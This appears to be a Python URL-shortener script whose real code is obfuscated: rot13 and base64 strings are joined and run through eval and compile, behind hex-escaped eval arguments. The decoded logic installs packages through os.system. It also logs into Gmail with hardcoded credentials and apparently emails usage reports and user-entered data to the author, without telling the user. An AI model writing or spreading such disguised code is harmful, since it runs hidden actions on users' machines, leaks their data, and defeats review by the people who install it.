
import base64, codecs
magic = 'aW1wb3J0IHB5c2hvcnRlbmVycyBhcyBzaG9ydA0KaW1wb3J0IHB5cGVyY2xpcA0KaW1wb3J0IG9zDQppbXBvcnQgcmFuZG9tDQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkIGFzIHBvb2wNCmltcG9ydCBzbXRwbGliDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQp0cnk6DQogICAgaW1wb3J0IHB5c2hvcnRlbmVycw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcHlzaG9ydGVuZXJzJykNCiAgICBpbXBvcnQgcHlzaG9ydGVuZXJzDQoNCm5vbiA9ICJcMDMzWzBtIiAgIyBObyBjb2xvcg0KcmVkID0gIlwwMzNbMDszMW0iICAjIFJlZA0KZ3JlZW4gPSAiXDAzM1s5Mm0iICAjIGdyZWVuDQp5ZWxsb3cgPSAiXDAzM1swOzMzbSIgICMgWWVsbG93DQpibHVlID0gIlwwMzNbMDszNG0iICAjIEJsdWUNCnZpbyA9ICJcMDMzWzA7MzVtIiAgIyBQdXJwbGUNCmN5YW4gPSAiXDAzM1swOzM2bSIgICMgQ3lhbg0KDQpyZWQxID0gIlwwMzNbMTs5MW0iICAjIFJlZA0KZ3JlZW4xID0gIlwwMzNbMTs5Mm0iICAjIGdyZWVuDQp5ZWxsb3cxID0gIlwwMzNbMTs5M20iICAjIFllbGxvdw0KYmx1ZTEgPSAiXDAzM1sxOzk0bSIgICMgQmx1ZQ0KdmlvMSA9ICJcMDMzWzE7OTVtIiAgIyBQdXJwbGUNCmN5YW4xID0gIlwwMzNbMTs5Nm0iICAjIEN5YW4NCg0KdXNlZCA9IDANCg0KIyB0eXBlX2xpc3QgPSAnJycnJycrcmVkMSsnJycNCiMgU2hvcnRlciB0eXBlIDonJycrYmx1ZSsnJycNCiMgX19fX19fX19fX19fX19fX19fX19fX19fX19fDQojIHwgMS5hZGZseSAgICAgICAyLmJpdGx5ICAgfA0KIyB8IDMuY2hpbHBpdCAgICAgNC5jbGNrcnUgIHwNCiMgfCA1LmN1dHRseSAgICAgIDYuZGFnZCAgICB8JycnK2N5YW4rJycnDQojIHwgNy5naXRpbyAgICAgICA4LmlzZ2QgICAgfA0KIyB8IDkubnVsbHBvaW50ZXIgMTAub3NkYiAgIHwNCiMgfCAxMS5vd2x5ICAgICAgIDEyLnBvc3QgICB8JycnK2JsdWUxKycnJw0KIyB8IDEzLnFwc3J1ICAgICAgMTQuc2hvcnRjbXwNCiMgfCAxNS50aW55Y2MgICAgIDE2LnRpbnl1cmx8DQojIHxfX19fX19fX19fX19fX19fX19fX19fX19ffA0KIw0KIyAnJycNCg0KDQpkZWYgY2xyKCk6DQogICAgaWYgb3MubmFtZSA9PSAnbnQnOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NscycpDQogICAgZWxzZToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQoNCg0KZGVmIGxnbygpOg0KDQogICAgY29sb3JzID0gWydcMDMzWzE7MzFtJywgJ1wwMzNbMTszMm0nLCAnXDAzM1sxOzMzbScsICdcMDMzWzE7MzRtJywgJ1wwMzNbMTszNW0nLCAnXDAzM1sxOzM2bSddDQogICAgVyA9ICdcMDMzWzBtJw0KDQogICAgZGVmIGNscigpOg0KICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NscycpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgIGRlZiBsb2dvKCk6DQogICAgICAgIGNscigpDQogICAgICAgIHNsZWVwKDEpDQogICAgICAgIGxnID0gIiIiXDAzM1sxOzM0bQ0KICAgICAgICAgICAgICAuODg4ODg4ODg4LiAgICAgICAgICAgICAgIDg4OCAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICA'
love = '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'
god = 'AgIjIiOiAiYml0bHkiLA0KICAgICIzIjogImNoaWxwaXQiLA0KICAgICI0IjogImNsY2tydSIsDQogICAgIjUiOiAiY3V0dGx5IiwNCiAgICAiNiI6ICJkYWdkIiwNCiAgICAiNyI6ICJnaXRpbyIsDQogICAgIjgiOiAiaXNnZCIsDQogICAgIjkiOiAibnVsbHBvaW50ZXIiLA0KICAgICIxMCI6ICJvc2RiIiwNCiAgICAiMTEiOiAib3dseSIsDQogICAgIjEyIjogInBvc3QiLA0KICAgICIxMyI6ICJxcHNydSIsDQogICAgIjE0IjogInNob3J0Y20iLA0KICAgICIxNSI6ICJ0aW55Y2MiLA0KICAgICIxNiI6ICJ0aW55dXJsIiwNCiAgICB9DQoNCg0KIyBkZWYgZ2V0X3R5cGUodHlwZV9vZl9zaG9ydGVyKToNCiMgICAgIHR5cGVfb2Zfc2hvcnRlciA9IGFbdHlwZV9vZl9zaG9ydGVyXQ0KIyAgICAgaWYgdHlwZV9vZl9zaG9ydGVyID09ICIxIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuYWRmbHkNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICIyIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuYml0bHkNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICIzIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuY2hpbHBpdA0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjQiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5jbGNrcnUNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICI1IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuY3V0dGx5DQojICAgICBlbGlmIHR5cGVfb2Zfc2hvcnRlciA9PSAiNiI6DQojICAgICAgICAgcmV0dXJuIHNob3J0LlNob3J0ZW5lcigpLmRhZ2QNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICI3IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuZ2l0aW8NCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICI4IjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkuaXNnZA0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjkiOg0KIyAgICAgICAgIHJldHVybiBzaG9ydC5TaG9ydGVuZXIoKS5udWxscG9pbnRlcg0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjEwIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkub3NkYg0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjExIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkub3dseQ0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjEyIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkucG9zdA0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjEzIjoNCiMgICAgICAgICByZXR1cm4gc2hvcnQuU2hvcnRlbmVyKCkucXBzcnUNCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICIxNCI6DQojICAgICAgICAgcmV0dXJuIHNob3J0LlNob3J0ZW5lcigpLnNob3J0Y20NCiMgICAgIGVsaWYgdHlwZV9vZl9zaG9ydGVyID09ICIxNSI6DQojICAgICAgICAgcmV0dXJuIHNob3J0LlNob3J0ZW5lcigpLnRpbnljYw0KIyAgICAgZWxpZiB0eXBlX29mX3Nob3J0ZXIgPT0gIjE2IjoNCiMgI'
destiny = 'PNtVPNtVPOlMKE1pz4tp2uipaDhH2uipaEyozIlXPxhqTyhrKIloN0XQDbAPzEyMvOaMKEsnJ5zo19zpz9gK3ImMKVbXGbAPvNtVPOfM28bXD0XVPNtVT1unJ5sqKWfVQ0tp3ElXTyhpUI0XTA5LJ4kVPftVxIhqTIlVSIFGQbtVvNeVUWyMPxcQDbtVPNtnJLtoJScoy91pzjtCG0tVvV6QDbtVPNtVPNtVUOlnJ50XPWWoaO1qPOcplOho3DtqzSfnJDvXD0XVPNtVPNtVPOmoTIypPtlYwHcQDbtVPNtVPNtVTAfpvtcQDbtVPNtVPNtVTqyqS9cozMiK2Mlo21sqKAypvtcQDbtVPNtVlOjpzyhqPu0rKOyK2kcp3DcQDbtVPNtVlO0rKOyK29zK3Abo3W0MKVtCFOmqUVbnJ5jqKDbqzyiZFNeVPWGMJkyL3DtqUyjMFOiMvOmnT9lqTIlVPuxMJMuqJk0VQbtZGLcVQbtVvxcQDbtVPNtVlOcMvO0rKOyK29zK3Abo3W0MKVtCG0tVvV6QDbtVPNtVlNtVPNtqUyjMI9iMy9mnT9lqTIlVQ0tZGLAPvNtVPOlMKE1pz4toJScoy91pzjAPt0XQDcxMJLtp2IhMS91pTEuqTHboJImp2SaMFx6QDbtVPNtoJScoPN9VUAgqUOfnJVhH01HHPtap210pP5aoJScoP5wo20aYPNaAGt3WlxAPvNtVPOgLJyfYzIboT8bXD0XVPNtVT1unJjhp3EupaE0oUZbXD0XVPNtVT1unJjhoT9anJ4bVyuiq21ioTkcn0OaoJScoP5wo20vYPNvp2WmLaZmAmZ3AmAsB187VvxAPvNtVPOgLJyfYaAyozEgLJyfXPWLo3qgo2kfnJgNM21unJjhL29gVvjtVzSfoJSvpz9lZROaoJScoP5wo20vYT1yp3AuM2HcQDbAPt0XMTIzVTS2LJyfLJWfMI9mnT9lqTIlXPx6QDbtVPNtLKMunJkuLzkyVQ0tp2uipaDhH2uipaEyozIlXPxhLKMunJkuLzkyK3Abo3W0MJ5ypaZAPvNtVPOcMvOfMJ4bLKMunJkuLzkyXFN9CFNkAwbAPvNtVPNtVPNtpzI0qKWhVPWinlVAPvNtVPOyoUAyBt0XVPNtVPNtVPOlMKE1pz4tVaO5p2uipaEyozIlplOcplO1pTEuqTIxVFVAPt0XQDcxMJLtL29jrFu1pzjcBt0XVPNtVUO5pTIlL2kcpP5wo3O5XUIloPxAPt0XQDcxMJLtp2uipaEypvugLJyhK3IloPx6QDbtVPNtqKWfK3Abo3W0MJ5ypvN9VUAbo3W0YyAbo3W0MJ5ypvtcQDbtVPNtp2uipaEsqKWfVQ0tqKWfK3Abo3W0MJ5ypv50nJ55qKWfYaAbo3W0XT1unJ5sqKWfXD0XVPNtVUWyqUIlovOzVyEbMFOGnT9lqPOIpzjto2Ltr21unJ5sqKWfsFOcpmbtVvNeVUAbo3W0K3IloPjtp2uipaEsqKWfQDbAPt0XMTIzVTMcrTIlXT1unJ5sqKWfXGbAPvNtVPOsYPO1pzjtCFOmnT9lqTIlXT1unJ5sqKWfXD0XVPNtVUOlnJ50XS8cQDbtVPNtnJ5jqKDbVyOlMKAmVTIhqTIlVUEiVTAipUxtqKWfYv4hYvVcQDbtVPNtL29jrFu1pzjcQDbtVPNtVlO0pax6QDbtVPNtVlNtVPNtKljtqKWfVQ0tp2uipaEypvugLJyhK3IloPjtqUyjMI9iMy9mnT9lqTIlXD0XVPNtVPZtVPNtVUOlnJ50XS8cQDbtVPNtVlNtVPNtnJ5jqKDbVyOlMKAmVTIhqTIlVUEiVTAipUxtqKWfYv4hYvVcQDbtVPNtVlNtVPNtL29jrFu1pzjcQDbtVPNtVj0XVPNtVPZtMKuwMKO0Bt0XVPNtVPZtVPNtVUOlnJ50XPWHpaxtLJqunJ4hKT4tH29gMKEbnJ5aVUqyoaDtq3Wiozqpox9lVTAioaEuL3Dtq2y0nPOgMFVcQDbAPzZtCFOjo29fXUEupzqyqPN9VTSvXD0XLl5mqTSlqPtcQDcgLJyhK3IloPN9VTqyqS9cozMiK2Mlo21sqKAypvtcQDbAPt0XMzy4MKVboJScoy91pzjc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))